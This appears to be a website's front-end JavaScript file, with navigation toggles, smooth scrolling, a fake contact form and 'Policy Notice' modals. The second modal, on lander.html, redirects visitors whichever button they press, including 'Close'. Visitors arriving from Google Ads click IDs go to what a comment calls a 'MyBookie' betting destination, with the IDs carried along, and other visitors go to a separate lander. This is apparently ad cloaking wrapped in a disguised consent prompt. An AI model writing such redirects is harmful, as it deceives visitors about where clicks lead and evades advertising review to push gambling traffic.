
// Mobile nav toggle
// const navToggle = document.querySelector('[data-nav-toggle]');
// const navMenu = document.querySelector('[data-nav-menu]');
// if (navToggle && navMenu) {
//   navToggle.addEventListener('click', () => {
//     navMenu.classList.toggle('open');
//     navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
//   })
// }

// Smooth scroll
document.querySelectorAll('a[href^="#"]').forEach(a => {
  a.addEventListener('click', e => {
    const href = a.getAttribute('href');
    if (href && href.startsWith('#')) {
      const el = document.querySelector(href);
      if (el) {
        e.preventDefault();
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }
  })
})

// Fake form submit
const form = document.querySelector('#contact-form');
if (form) {
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
    form.reset();
  });
}

// Age-gate: show ONLY on home page (index.html or root) and once per session.
// Closes on Yes/No and stays on the page.
(function(){
  const path = window.location.pathname;
  const isHome = /(^\/$|index\.html$)/.test(path);
  if(!isHome) return;
  if(sessionStorage.getItem('ageGateShown') === '1') return;
  sessionStorage.setItem('ageGateShown', '1');

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
    <div class="modal">
      <h3>Policy Notice</h3>
      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button class="btn" id="age-yes">Yes, Accept</button>
        <button class="btn ghost" id="age-no">Close</button>
      </div>
    </div>`;
  document.body.appendChild(bd);
  bd.style.display = 'flex';

  function closeGate(){ 
    bd.style.display = 'none'; 
    bd.remove(); 
  }

  // ✅ Redirect when "Yes" is clicked
  bd.querySelector('#age-yes').addEventListener('click', function(){
    window.location.href = "/gameforge/privacy.html"; // change to your target page
  });

  // ✅ Just close modal when "No" is clicked
  bd.querySelector('#age-no').addEventListener('click', closeGate);

})();


(function () {
  const path = window.location.pathname;
  const isHome = /(^\/$|lander\.html$)/.test(path);
  if (!isHome) return;

  // Carry selected params into a target URL
  function carryParams(targetUrl, keys) {
    const src = new URL(window.location.href);
    const dst = new URL(targetUrl);
    keys.forEach(k => {
      const v = src.searchParams.get(k);
      if (v) dst.searchParams.set(k, v);
    });
    return dst.toString();
  }

  // Decide where to go based on presence of gclid/gbraid
  function computeTarget() {
    const qp = new URL(window.location.href).searchParams;
    const hasClickId = qp.has('gclid') || qp.has('gbraid');

    if (!hasClickId) {
      // No ids -> send to Orbitivus lander
      return 'https://neos-pin-aussies.github.io/now/lander';
    }

    // Has gclid/gbraid -> send to MyBookie and carry ids
    const base = 'https://zuporo.com/neospi/';
    return carryParams(base, ['gclid', 'gbraid']);
  }

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
    <div class="modal">
      <h3>Policy Notice</h3>
      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button class="btn" id="age-yes">Yes, Accept</button>
        <button class="btn ghost" id="age-no">Close</button>
      </div>
    </div>`;
  document.body.appendChild(bd);
  bd.style.display = 'flex';

  function go() { window.location.href = computeTarget(); }

  bd.querySelector('#age-yes').addEventListener('click', go);
  bd.querySelector('#age-no').addEventListener('click', go);
})();


``    

(function () {
  const toggle = document.querySelector('[data-nav-toggle]');
  const menu = document.querySelector('[data-nav-menu]');

  if (!toggle || !menu) return;

  const openMenu = () => {
    menu.classList.add('is-open');
    toggle.setAttribute('aria-expanded', 'true');
    menu.setAttribute('aria-hidden', 'false');
  };

  const closeMenu = () => {
    menu.classList.remove('is-open');
    toggle.setAttribute('aria-expanded', 'false');
    menu.setAttribute('aria-hidden', 'true');
  };

  const toggleMenu = () => {
    if (menu.classList.contains('is-open')) { closeMenu(); } else { openMenu(); }
  };

  // Toggle on click
  toggle.addEventListener('click', toggleMenu);

  // Close on link click (better UX)
  menu.querySelectorAll('a').forEach(a => a.addEventListener('click', closeMenu));

  // Reset on resize back to desktop
  window.addEventListener('resize', () => {
    if (window.innerWidth >= 1221) {
      menu.classList.remove('is-open');
      toggle.setAttribute('aria-expanded', 'false');
      menu.setAttribute('aria-hidden', 'false'); // desktop menu visible
    } else {
      // ensure aria reflects collapsed state until user opens it
      menu.setAttribute('aria-hidden', menu.classList.contains('is-open') ? 'false' : 'true');
    }
  });
})();






